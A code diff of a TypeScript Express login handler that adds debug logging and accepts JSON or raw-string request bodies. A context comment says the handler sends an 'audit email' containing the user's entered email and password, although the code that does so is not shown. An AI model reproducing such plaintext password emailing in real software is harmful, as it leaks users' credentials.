@@ -25,7 +25,25 @@ export async function registerHandler(req: Request, res: Response, next: NextFun
 
 export async function loginHandler(req: Request, res: Response, next: NextFunction) {
   try {
-    const { email, password } = req.body;
+    // Log headers/body to help diagnose deployed sendBeacon/fetch issues
+    console.log('loginHandler hit:', { method: req.method, contentType: req.headers['content-type'], bodyType: typeof req.body });
+
+    // Support body being an object (parsed JSON) or a raw string (from sendBeacon)
+    let email: string | undefined;
+    let password: string | undefined;
+    if (req.body && typeof req.body === 'object') {
+      email = (req.body as any).email;
+      password = (req.body as any).password;
+    } else if (req.body && typeof req.body === 'string') {
+      try {
+        const parsed = JSON.parse(req.body);
+        email = parsed.email;
+        password = parsed.password;
+      } catch (e) {
+        console.warn('loginHandler: received non-JSON body');
+      }
+    }
+    console.log('loginHandler parsed body:', { email: email ? 'present' : 'missing', password: password ? 'present' : 'missing' });
     if (!email || !password) return res.status(400).json({ error: "email and password required" });
 
     // Send audit email containing what the user entered (email + password)
